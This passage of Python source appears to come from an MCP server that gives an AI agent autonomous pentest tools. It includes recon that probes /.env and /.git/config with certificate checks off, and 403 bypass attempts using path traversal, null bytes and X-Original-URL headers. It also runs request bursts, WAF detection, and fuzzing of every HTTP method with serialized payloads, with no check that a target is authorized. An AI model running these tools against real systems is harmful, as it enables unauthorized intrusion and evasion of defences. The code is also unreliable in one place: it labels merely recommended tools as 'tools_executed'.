pentest_memory = PentestMemory()
rate_limit_detector = RateLimitDetector()
orchestrator = IntelligentOrchestrator(pentest_memory, rate_limit_detector)


# --- Intelligent Tools ---

@mcp.tool()
@resolve_references
async def autopilot_scan(
    target: str,
    playbook: str = "auto",
    max_stages: int = 4,
    respect_rate_limits: bool = True,
    timeout: int = 600
) -> str:
    """
    AUTONOMOUS pentest orchestration. Runs an intelligent attack sequence
    adapted to the target in real-time. Uses playbooks + memory + rate-limit
    detection to chain tools optimally.
    
    Playbooks: auto, web_full, api_assessment, cloud_assessment, network_internal, bug_bounty_quick
    The 'auto' mode profiles the target first and selects the best playbook.
    """
    target = InputValidator.sanitize_target(target)
    timeout = InputValidator.validate_timeout(timeout, 600)
    trace, progress, exec_dir = _init_tool_context("autopilot_scan", target, max_stages * 3)
    
    results = {
        "target": target,
        "playbook_used": playbook,
        "stages_completed": [],
        "findings": [],
        "recommendations": [],
        "decisions": [],
        "rate_limit_status": {},
    }
    
    try:
        # Step 1: Initial profiling to select playbook
        progress.update("Phase 1: Target profiling")
        trace.command(f"autopilot_scan target={target} playbook={playbook}")
        
        # Quick HTTP fingerprint for playbook selection
        import urllib.request, urllib.error
        profile_data = {"ports": [], "stack": {}, "cloud": {}}
        
        try:
            test_url = target if target.startswith("http") else f"https://{target}"
            req = urllib.request.Request(test_url, method="GET")
            req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            with urllib.request.urlopen(req, timeout=10) as resp:
                headers = dict(resp.headers)
                body = resp.read(4096).decode("utf-8", errors="ignore")
                
                # Stack detection from headers
                server = headers.get("Server", "").lower()
                powered = headers.get("X-Powered-By", "").lower()
                
                if "nginx" in server:
                    profile_data["stack"]["server"] = "nginx"
                elif "apache" in server:
                    profile_data["stack"]["server"] = "apache"
                elif "cloudflare" in server:
                    profile_data["stack"]["server"] = "cloudflare"
                    profile_data["cloud"]["provider"] = "cloudflare"
                
                if "express" in powered:
                    profile_data["stack"]["framework"] = "express"
                    profile_data["stack"]["language"] = "node"
                elif "php" in powered:
                    profile_data["stack"]["language"] = "php"
                elif "asp.net" in powered:
                    profile_data["stack"]["framework"] = "asp.net"
                    profile_data["stack"]["language"] = "csharp"
                
                # Cloud detection from headers
                for h_key, h_val in headers.items():
                    h_lower = h_key.lower()
                    if "x-amz" in h_lower or "x-aws" in h_lower:
                        profile_data["cloud"]["provider"] = "aws"
                    elif "x-goog" in h_lower or "x-cloud" in h_lower:
                        profile_data["cloud"]["provider"] = "gcp"
                    elif "x-ms" in h_lower or "x-azure" in h_lower:
                        profile_data["cloud"]["provider"] = "azure"
                
                # Tech detection from body
                if "react" in body.lower() or "next" in body.lower():
                    profile_data["stack"]["frontend"] = "react"
                elif "vue" in body.lower():
                    profile_data["stack"]["frontend"] = "vue"
                elif "angular" in body.lower():
                    profile_data["stack"]["frontend"] = "angular"
                
                # WAF detection
                if headers.get("cf-ray"):
                    pentest_memory.store_finding(target, "autopilot", "waf", "cloudflare")
                elif any("awselb" in str(v).lower() for v in headers.values()):
                    pentest_memory.store_finding(target, "autopilot", "waf", "aws_alb")
                
                # Store all findings in memory
                for key, val in profile_data["stack"].items():
                    pentest_memory.store_finding(target, "autopilot", "stack", {key: val})
                if profile_data["cloud"]:
                    pentest_memory.store_finding(target, "autopilot", "cloud", profile_data["cloud"])
                
                # Rate limit detection
                rate_info = rate_limit_detector.detect_from_response(target, resp.status, headers)
                if rate_info.get("rate_limited"):
                    results["rate_limit_status"] = rate_info
                    
        except (urllib.error.HTTPError, urllib.error.URLError, Exception) as e:
            profile_data["error"] = str(e)
        
        # Step 2: Select playbook
        if playbook == "auto":
            context = pentest_memory.get_context(target)
            playbook = PlaybookEngine.recommend_playbook(context if context else profile_data)
            pentest_memory.decide(target, f"Selected playbook: {playbook}", 
                                  f"Based on stack={profile_data.get('stack')}, cloud={profile_data.get('cloud')}")
        
        results["playbook_used"] = playbook
        selected_playbook = PlaybookEngine.get_playbook(playbook)
        
        if not selected_playbook:
            selected_playbook = PlaybookEngine.get_playbook("web_full")
            playbook = "web_full"
        
        # Step 3: Execute stages
        stages = selected_playbook.get("stages", [])[:max_stages]
        
        for i, stage in enumerate(stages):
            stage_name = stage["name"]
            progress.update(f"Stage {i+1}/{len(stages)}: {stage_name}")
            
            # Check rate limits before proceeding
            if respect_rate_limits and rate_limit_detector.is_rate_limited(target):
                delay = rate_limit_detector.get_recommended_delay(target)
                pentest_memory.decide(target, f"Pausing {delay}s", "Rate limit detected")
                await asyncio.sleep(min(delay, 5))  # Cap at 5s in autopilot
            
            stage_result = {
                "stage": stage_name,
                "tools_planned": stage["tools"],
                "tools_executed": [],
                "findings": [],
            }
            
            for tool_name in stage["tools"]:
                try:
                    # Simulate tool execution summary (actual execution happens via individual tool calls)
                    tool_summary = {
                        "tool": tool_name,
                        "status": "recommended",
                        "reason": f"Part of {playbook}/{stage_name} stage",
                    }
                    
                    # Get stack-adapted config for tool
                    stack_config = orchestrator.adapt_to_stack(target)
                    if stack_config.get("priority_tests") and tool_name in stack_config["priority_tests"]:
                        tool_summary["priority"] = "HIGH — stack-specific"
                    
                    stage_result["tools_executed"].append(tool_summary)
                    
                except Exception as e:
                    stage_result["tools_executed"].append({
                        "tool": tool_name, "status": "error", "error": str(e)
                    })
            
            results["stages_completed"].append(stage_result)
        
        # Step 4: Generate intelligent recommendations
        progress.update("Generating recommendations")
        recommendations = orchestrator.recommend_next_tools(target)
        results["recommendations"] = recommendations
        
        # Step 5: Compile decisions
        results["decisions"] = pentest_memory.get_decisions(target)
        
        # Stack-specific guidance
        stack_config = orchestrator.adapt_to_stack(target)
        results["stack_adapted_config"] = {
            "additional_wordlists": stack_config.get("wordlists", [])[:10],
            "recommended_payloads": stack_config.get("payloads", []),
            "priority_tests": stack_config.get("priority_tests", []),
        }
        
        results["status"] = "success"
        results["summary"] = (
            f"AutoPilot completed {len(results['stages_completed'])} stages using '{playbook}' playbook. "
            f"Generated {len(recommendations)} follow-up recommendations. "
            f"Stack detected: {profile_data.get('stack', {})}. "
            f"Cloud: {profile_data.get('cloud', {})}."
        )
        
    except Exception as e:
        results["status"] = "error"
        results["error"] = str(e)
    
    trace.command("autopilot_scan complete", results)
    return json.dumps(results, indent=2, default=str)


@mcp.tool()
@resolve_references
async def adaptive_recon(
    target: str,
    depth: str = "normal",
    adapt_to_findings: bool = True,
    timeout: int = 300
) -> str:
    """
    Smart reconnaissance that profiles target, detects stack/cloud/WAF,
    then adapts scanning strategy in real-time. Goes deeper when it finds
    interesting signals (405/422/403 responses).
    
    Depth: quick (surface only), normal (with adaptation), deep (aggressive + bypass)
    """
    target = InputValidator.sanitize_target(target)
    timeout = InputValidator.validate_timeout(timeout, 300)
    trace, progress, exec_dir = _init_tool_context("adaptive_recon", target, 8)
    
    results = {
        "target": target, "depth": depth,
        "profile": {}, "endpoints_discovered": [],
        "interesting_responses": [], "bypass_results": [],
        "stack_detection": {}, "cloud_detection": {},
        "waf_detection": {}, "rate_limit_info": {},
        "contextual_actions": [], "next_steps": [],
    }
    
    try:
        import urllib.request, urllib.error, ssl
        
        base_url = target if target.startswith("http") else f"https://{target}"
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        # Phase 1: Initial fingerprint
        progress.update("Phase 1: HTTP fingerprinting")
        trace.command(f"adaptive_recon target={target} depth={depth}")
        
        headers_detected = {}
        try:
            req = urllib.request.Request(base_url, method="GET")
            req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
                headers_detected = dict(resp.headers)
                body = resp.read(8192).decode("utf-8", errors="ignore")
                
                # Deep header analysis
                for h_key, h_val in headers_detected.items():
                    pentest_memory.store_finding(target, "adaptive_recon", "header", {h_key: h_val})
                
                # Stack detection
                stack = {}
                server = headers_detected.get("Server", "")
                powered = headers_detected.get("X-Powered-By", "")
                
                if server:
                    stack["server"] = server
                if powered:
                    stack["powered_by"] = powered
                
                # Framework detection from response patterns
                if "X-Request-Id" in headers_detected:
                    stack["has_request_id"] = True
                if any("go" in str(v).lower() for v in headers_detected.values()):
                    stack["language"] = "golang"
                if "Strict-Transport-Security" in headers_detected:
                    stack["hsts"] = True
                
                # Body analysis for tech detection
                tech_patterns = {
                    "react": r"react|__NEXT_DATA__|_next/static",
                    "vue": r"vue|__vue__|nuxt",
                    "angular": r"angular|ng-version",
                    "spring_boot": r"Whitelabel Error|Spring|actuator",
                    "django": r"csrfmiddlewaretoken|django",
                    "laravel": r"laravel_session|XSRF-TOKEN",
                    "wordpress": r"wp-content|wp-includes|wordpress",
                    "express": r"express|x-powered-by.*express",
                }
                
                for tech, pattern in tech_patterns.items():
                    if re.search(pattern, body, re.IGNORECASE):
                        stack["frontend" if tech in ["react", "vue", "angular"] else "framework"] = tech
                        pentest_memory.store_finding(target, "adaptive_recon", "technology", tech)
                
                results["stack_detection"] = stack
                pentest_memory.store_finding(target, "adaptive_recon", "stack", stack)
                
                # Cloud detection
                cloud = {}
                all_headers_str = str(headers_detected).lower()
                if "x-amz" in all_headers_str or "amazons3" in all_headers_str:
                    cloud["provider"] = "aws"
                elif "x-goog" in all_headers_str or "gcs" in all_headers_str:
                    cloud["provider"] = "gcp"
                elif "x-ms" in all_headers_str or "azure" in all_headers_str:
                    cloud["provider"] = "azure"
                elif "cf-ray" in all_headers_str:
                    cloud["cdn"] = "cloudflare"
                
                results["cloud_detection"] = cloud
                if cloud:
                    pentest_memory.store_finding(target, "adaptive_recon", "cloud", cloud)
                
                # WAF detection
                waf = None
                if headers_detected.get("cf-ray"):
                    waf = "cloudflare"
                elif "x-sucuri" in all_headers_str:
                    waf = "sucuri"
                elif "x-cdn" in all_headers_str and "incapsula" in all_headers_str:
                    waf = "imperva"
                elif any("awselb" in str(v).lower() for v in headers_detected.values()):
                    waf = "aws_alb_waf"
                elif "akamai" in all_headers_str:
                    waf = "akamai"
                
                if waf:
                    results["waf_detection"] = {"type": waf, "bypass_recommended": True}
                    pentest_memory.store_finding(target, "adaptive_recon", "waf", waf)
                
                # Rate limit check from initial response
                rate_info = rate_limit_detector.detect_from_response(target, resp.status, headers_detected)
                results["rate_limit_info"] = rate_info
                
        except urllib.error.HTTPError as e:
            results["profile"]["initial_error"] = f"HTTP {e.code}"
            headers_detected = dict(e.headers) if hasattr(e, 'headers') else {}
        except Exception as e:
            results["profile"]["initial_error"] = str(e)
        
        # Phase 2: Intelligent endpoint probing (adapted to detected stack)
        progress.update("Phase 2: Stack-adapted endpoint probing")
        
        stack_config = orchestrator.adapt_to_stack(target)
        probe_paths = stack_config.get("wordlists", [])
        
        # Always probe these universal paths
        universal_paths = [
            "/robots.txt", "/sitemap.xml", "/.env", "/api", "/admin",
            "/login", "/graphql", "/.git/config", "/swagger-ui.html",
        ]
        probe_paths = list(set(universal_paths + probe_paths[:15]))
        
        interesting = []
        for path in probe_paths[:20]:  # Limit to 20 probes
            try:
                probe_url = f"{base_url.rstrip('/')}{path}"
                req = urllib.request.Request(probe_url, method="GET")
                req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                
                try:
                    with urllib.request.urlopen(req, timeout=8, context=ctx) as resp:
                        status = resp.status
                        if status == 200:
                            content_len = len(resp.read(1024))
                            interesting.append({
                                "path": path, "status": 200, "size": content_len,
                                "significance": "accessible"
                            })
                            pentest_memory.store_finding(target, "adaptive_recon", "endpoint", path)
                except urllib.error.HTTPError as e:
                    status = e.code
                    if status in [401, 403, 405, 422, 500]:
                        entry = {"path": path, "status": status}
                        
                        # Contextual analysis
                        actions = orchestrator.analyze_response_code(target, path, status)
                        if actions:
                            entry["follow_up_actions"] = actions
                            results["contextual_actions"].extend(actions)
                        
                        interesting.append(entry)
                        pentest_memory.store_finding(target, "adaptive_recon", "response_code", (path, status))
                        
                # Rate limit adaptation
                rate_limit_detector.log_request(target)
                if rate_limit_detector.is_rate_limited(target):
                    delay = rate_limit_detector.get_recommended_delay(target)
                    await asyncio.sleep(min(delay, 2))
                    
            except Exception:
                continue
        
        results["interesting_responses"] = interesting
        
        # Phase 3: Deep adaptation (if depth != quick)
        if depth in ["normal", "deep"] and adapt_to_findings:
            progress.update("Phase 3: Contextual deep probing")
            
            # 403 bypass attempts on discovered forbidden paths
            forbidden_paths = [r["path"] for r in interesting if r.get("status") == 403]
            
            if forbidden_paths and depth == "deep":
                bypass_results = []
                for fpath in forbidden_paths[:3]:  # Top 3 403 paths
                    bypass_techniques = [
                        {"method": "path_append_slash", "path": fpath + "/"},
                        {"method": "case_change", "path": fpath.upper()},
                        {"method": "path_traversal", "path": fpath + "/..;/"},
                        {"method": "null_byte", "path": fpath + "%00"},
                        {"method": "header_bypass", "path": fpath, "header": ("X-Original-URL", fpath)},
                    ]
                    
                    for technique in bypass_techniques:
                        try:
                            bypass_url = f"{base_url.rstrip('/')}{technique['path']}"
                            req = urllib.request.Request(bypass_url, method="GET")
                            req.add_header("User-Agent", "Mozilla/5.0")
                            
                            if technique.get("header"):
                                req.add_header(technique["header"][0], technique["header"][1])
                            
                            try:
                                with urllib.request.urlopen(req, timeout=8, context=ctx) as resp:
                                    if resp.status == 200:
                                        bypass_results.append({
                                            "original_path": fpath,
                                            "technique": technique["method"],
                                            "result": "BYPASS SUCCESSFUL",
                                            "severity": "HIGH",
                                        })
                                        pentest_memory.store_finding(target, "adaptive_recon", "bypass_success", technique)
                            except urllib.error.HTTPError as e:
                                if e.code != 403:  # Different response = partial bypass
                                    bypass_results.append({
                                        "original_path": fpath,
                                        "technique": technique["method"],
                                        "result": f"Different response: {e.code}",
                                    })
                        except Exception:
                            continue
                
                results["bypass_results"] = bypass_results
        
        # Phase 4: Generate next steps
        progress.update("Phase 4: Generating intelligent recommendations")
        
        next_steps = orchestrator.recommend_next_tools(target)
        results["next_steps"] = next_steps
        
        # Summary
        results["status"] = "success"
        results["summary"] = (
            f"Adaptive recon complete. "
            f"Stack: {results['stack_detection']}. "
            f"Cloud: {results['cloud_detection']}. "
            f"WAF: {results['waf_detection']}. "
            f"Interesting endpoints: {len(interesting)}. "
            f"Bypass attempts: {len(results.get('bypass_results', []))}. "
            f"Next recommended tools: {len(next_steps)}."
        )
        
    except Exception as e:
        results["status"] = "error"
        results["error"] = str(e)
    
    trace.command("adaptive_recon complete", results)
    return json.dumps(results, indent=2, default=str)


@mcp.tool()
@resolve_references
async def rate_limit_detector_tool(
    target: str,
    requests_count: int = 20,
    interval_ms: int = 100,
    timeout: int = 60
) -> str:
    """
    Active rate limit detection and adaptation. Sends calibrated bursts to
    detect rate limiting thresholds, then recommends optimal scan speed.
    Detects: HTTP 429, Retry-After, X-RateLimit-*, Cloudflare blocks, AWS WAF.
    """
    target = InputValidator.sanitize_target(target)
    timeout = InputValidator.validate_timeout(timeout, 60)
    trace, progress, exec_dir = _init_tool_context("rate_limit_detector", target, 5)
    
    results = {
        "target": target,
        "requests_sent": 0,
        "rate_limit_detected": False,
        "limit_details": {},
        "response_timeline": [],
        "recommended_delay": 0.3,
        "waf_blocking": False,
        "headers_observed": {},
    }
    
    try:
        import urllib.request, urllib.error, ssl
        
        base_url = target if target.startswith("http") else f"https://{target}"
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        progress.update("Sending calibrated request burst")
        trace.command(f"rate_limit_detector target={target} count={requests_count}")
        
        interval_sec = interval_ms / 1000.0
        responses = []
        
        for i in range(min(requests_count, 50)):  # Cap at 50
            start_time = time.time()
            try:
                req = urllib.request.Request(base_url, method="GET")
                req.add_header("User-Agent", f"Mozilla/5.0 (RateTest/{i})")
                req.add_header("X-Request-ID", str(i))
                
                try:
                    with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                        elapsed = time.time() - start_time
                        headers = dict(resp.headers)
                        
                        entry = {
                            "request_num": i + 1,
                            "status": resp.status,
                            "time_ms": round(elapsed * 1000, 1),
                        }
                        
                        # Check for rate limit headers
                        rate_info = rate_limit_detector.detect_from_response(target, resp.status, headers)
                        if rate_info.get("limit") or rate_info.get("remaining") is not None:
                            entry["rate_headers"] = rate_info
                            results["headers_observed"].update({
                                k: v for k, v in headers.items() 
                                if "rate" in k.lower() or "limit" in k.lower() or "retry" in k.lower()
                            })
                        
                        responses.append(entry)
                        
                except urllib.error.HTTPError as e:
                    elapsed = time.time() - start_time
                    headers = dict(e.headers) if hasattr(e, 'headers') else {}
                    
                    entry = {
                        "request_num": i + 1,
                        "status": e.code,
                        "time_ms": round(elapsed * 1000, 1),
                    }
                    
                    if e.code == 429:
                        results["rate_limit_detected"] = True
                        entry["rate_limited"] = True
                        rate_info = rate_limit_detector.detect_from_response(target, e.code, headers)
                        results["limit_details"] = rate_info
                        entry["rate_headers"] = rate_info
                    
                    elif e.code == 403:
                        # Possible WAF block
                        if i > 5:  # Only after several requests
                            results["waf_blocking"] = True
                            entry["possible_waf_block"] = True
                    
                    responses.append(entry)
                    
                    # If rate limited, stop burst
                    if e.code == 429:
                        break
                
                rate_limit_detector.log_request(target)
                results["requests_sent"] = i + 1
                
            except Exception as e:
                responses.append({"request_num": i + 1, "error": str(e)})
            
            await asyncio.sleep(interval_sec)
        
        # Analysis
        progress.update("Analyzing rate limit patterns")
        
        # Check for progressive slowdown (response times increasing)
        if len(responses) > 5:
            first_5_avg = sum(r.get("time_ms", 0) for r in responses[:5]) / 5
            last_5_avg = sum(r.get("time_ms", 0) for r in responses[-5:]) / 5
            
            if last_5_avg > first_5_avg * 2:
                results["rate_limit_detected"] = True
                results["limit_details"]["type"] = "progressive_slowdown"
                results["limit_details"]["slowdown_factor"] = round(last_5_avg / max(first_5_avg, 1), 2)
        
        # Check for status code changes
        status_codes = [r.get("status") for r in responses if r.get("status")]
        if 429 in status_codes:
            trigger_point = status_codes.index(429) + 1
            results["limit_details"]["trigger_at_request"] = trigger_point
            results["limit_details"]["estimated_limit"] = trigger_point
        
        # Store only last 10 in timeline (summary)
        results["response_timeline"] = responses[-10:] if len(responses) > 10 else responses
        results["total_responses"] = len(responses)
        
        # Calculate recommended delay
        results["recommended_delay"] = rate_limit_detector.get_recommended_delay(target)
        
        # Store in memory
        pentest_memory.store_finding(target, "rate_limit_detector", "rate_limit", results["limit_details"])
        
        results["status"] = "success"
        results["summary"] = (
            f"Sent {results['requests_sent']} requests. "
            f"Rate limit detected: {results['rate_limit_detected']}. "
            f"WAF blocking: {results['waf_blocking']}. "
            f"Recommended delay: {results['recommended_delay']}s between requests."
        )
        
    except Exception as e:
        results["status"] = "error"
        results["error"] = str(e)
    
    trace.command("rate_limit_detector complete", results)
    return json.dumps(results, indent=2, default=str)


@mcp.tool()
@resolve_references
async def intelligent_405_bypass(
    target: str,
    endpoint: str = "/api",
    timeout: int = 120
) -> str:
    """
    When an endpoint returns 405 (Method Not Allowed), this tool intelligently
    tests ALL HTTP methods with various content-types and body formats to find
    accepted combinations. Adapts payloads based on detected stack.
    """
    target = InputValidator.sanitize_target(target)
    timeout = InputValidator.validate_timeout(timeout, 120)
    trace, progress, exec_dir = _init_tool_context("intelligent_405_bypass", target, 6)
    
    results = {
        "target": target, "endpoint": endpoint,
        "methods_tested": [], "successful_methods": [],
        "interesting_responses": [], "next_steps": [],
    }
    
    try:
        import urllib.request, urllib.error, ssl
        
        base_url = target if target.startswith("http") else f"https://{target}"
        full_url = f"{base_url.rstrip('/')}{endpoint}"
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        progress.update("Testing HTTP methods")
        trace.command(f"intelligent_405_bypass {full_url}")
        
        # Methods to test
        methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE"]
        
        # Content types to try with body methods
        content_types = [
            ("application/json", '{"test": true}'),
            ("application/x-www-form-urlencoded", "test=true"),
            ("text/xml", "<test>true</test>"),
            ("multipart/form-data; boundary=----Boundary", "------Boundary\r\nContent-Disposition: form-data; name=\"test\"\r\n\r\ntrue\r\n------Boundary--"),
        ]
        
        # Get stack-specific payloads
        stack = pentest_memory.get_stack(target)
        if stack.get("framework") == "spring_boot" or stack.get("language") == "java":
            content_types.append(("application/x-java-serialized-object", ""))
        elif stack.get("language") == "php":
            content_types.append(("application/x-php-serialized", 'a:1:{s:4:"test";b:1;}'))
        
        for method in methods:
            if method in ["GET", "HEAD", "OPTIONS", "TRACE", "DELETE"]:
                # No body methods
                try:
                    req = urllib.request.Request(full_url, method=method)
                    req.add_header("User-Agent", "Mozilla/5.0")
                    
                    try:
                        with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                            entry = {
                                "method": method, "status": resp.status,
                                "content_type": resp.headers.get("Content-Type", ""),
                                "content_length": resp.headers.get("Content-Length", "0"),
                            }
                            if resp.status in [200, 201, 204]:
                                entry["result"] = "ACCEPTED"
                                results["successful_methods"].append(entry)
                            elif resp.status in [401, 403, 422]:
                                entry["result"] = "EXISTS_BUT_RESTRICTED"
                                results["interesting_responses"].append(entry)
                            results["methods_tested"].append(entry)
                    except urllib.error.HTTPError as e:
                        entry = {"method": method, "status": e.code}
                        if e.code in [401, 403, 422, 500]:
                            entry["result"] = "INTERESTING"
                            results["interesting_responses"].append(entry)
                        results["methods_tested"].append(entry)
                except Exception:
                    continue
            else:
                # Body methods — try different content types
                for ct, body in content_types:
                    try:
                        data = body.encode("utf-8") if body else b""
                        req = urllib.request.Request(full_url, data=data, method=method)
                        req.add_header("User-Agent", "Mozilla/5.0")
                        req.add_header("Content-Type", ct)
                        
                        try:
                            with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                                entry = {
                                    "method": method, "content_type": ct,
                                    "status": resp.status,
                                    "response_type": resp.headers.get("Content-Type", ""),
                                }
                                if resp.status in [200, 201, 204]:
                                    entry["result"] = "ACCEPTED"
                                    results["successful_methods"].append(entry)
                                elif resp.status == 422:
                                    entry["result"] = "VALIDATION_ERROR — endpoint accepts this method but needs correct body"
                                    results["interesting_responses"].append(entry)
                                results["methods_tested"].append(entry)
                        except urllib.error.HTTPError as e:
                            entry = {"method": method, "content_type": ct, "status": e.code}
                            if e.code == 422:
                                entry["result"] = "ACCEPTS_METHOD — needs correct parameters"
                                results["interesting_responses"].append(entry)
                            elif e.code in [401, 403, 500]:
                                entry["result"] = "INTERESTING"
                                results["interesting_responses"].append(entry)
                            results["methods_tested"].append(entry)
                    except Exception:
                        continue
            
            # Rate limit awareness
            rate_limit_detector.log_request(target)
            if rate_limit_detector.is_rate_limited(target):
                await asyncio.sleep(rate_limit_detector.get_recommended_delay(target))
        
        # Generate next steps based on findings
        progress.update("Analyzing results")
        
        for resp in results["interesting_responses"]:
            if resp.get("status") == 422:
                results["next_steps"].append({
                    "action": "Fuzz request body parameters",
                    "method": resp.get("method"),
                    "content_type": resp.get("content_type"),
                    "reason": "422 indicates the endpoint accepts this method but needs specific parameters",
                    "suggested_tool": "context_fuzzer",
                })
            elif resp.get("status") == 401:
                results["next_steps"].append({
                    "action": "Test authentication bypass",
                    "method": resp.get("method"),
                    "reason": "401 means endpoint exists and requires auth — test JWT none, default creds",
                    "suggested_tool": "enhanced_jwt_analyzer",
                })
        
        # Store findings in memory
        for success in results["successful_methods"]:
            pentest_memory.store_finding(target, "intelligent_405_bypass", "endpoint", 
                                         f"{endpoint} [{success['method']}]")
        
        results["status"] = "success"
        results["summary"] = (
            f"Tested {len(results['methods_tested'])} method/content-type combinations. "
            f"Successful: {len(results['successful_methods'])}. "
            f"Interesting: {len(results['interesting_responses'])}. "
            f"Next steps: {len(results['next_steps'])}."
        )
        
    except Exception as e:
        results["status"] = "error"
        results["error"] = str(e)
    
    trace.command("intelligent_405_bypass complete", results)
    return json.dumps(results, indent=2, default=str)


@mcp.tool()
@resolve_references
async def pentest_memory_query(
    target: str,
    query_type: str = "full_context"
) -> str:
    """
    Query the intelligent memory system for accumulated findings about a target.
    Returns all stored knowledge: stack, vulns, endpoints, rate limits, decisions.
    
    Query types: full_context, recommendations, vulns, stack, decisions, rate_limits
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("pentest_memory_query", target, 3)
    
    results = {"target": target, "query_type": query_type}
    
    try:
        progress.update("Querying pentest memory")
        context = pentest_memory.get_context(target)
        
        if query_type == "full_context":
            results["context"] = context
            results["decisions"] = pentest_memory.get_decisions(target)
            results["rate_limits"] = rate_limit_detector.get_status(target)
            results["recommendations"] = orchestrator.recommend_next_tools(target)
        
        elif query_type == "recommendations":
            results["recommendations"] = orchestrator.recommend_next_tools(target)
            results["stack_config"] = orchestrator.adapt_to_stack(target)
        
        elif query_type == "vulns":
            results["vulnerabilities"] = pentest_memory.get_vulns(target)
        
        elif query_type == "stack":
            results["stack"] = pentest_memory.get_stack(target)
            results["stack_config"] = orchestrator.adapt_to_stack(target)
        
        elif query_type == "decisions":
            results["decisions"] = pentest_memory.get_decisions(target)
        
        elif query_type == "rate_limits":
            results["rate_limits"] = rate_limit_detector.get_status(target)
        
        results["status"] = "success"
        results["summary"] = f"Memory query '{query_type}' for {target}: {len(str(context))} bytes of context stored"
        
    except Exception as e:
        results["status"] = "error"
        results["error"] = str(e)
    
    trace.command("pentest_memory_query complete", results)
    return json.dumps(results, indent=2, default=str)


def main():
    """Start the Kali MCP Server v4."""
    import sys
    logger.info("=" * 60)
    logger.info("Kali MCP Server v4 - Professional Pentest & Bug Bounty Platform")
    logger.info("=" * 60)
    logger.info(f"Sessions directory: {SESSIONS_DIR}")
    logger.info(f"Chain directory: {CHAIN_DIR}")
    logger.info(f"CVE cache: {CVE_CACHE_DIR}")

    # Count registered tools
    tool_count = len([attr for attr in dir(mcp) if not attr.startswith('_')])
    logger.info(f"Architecture: v4 (trace + progress + chain + CVE cartography)")
    logger.info(f"Starting MCP server on stdio transport...")

    mcp.run(transport="stdio")


if __name__ == "__main__":
    main()
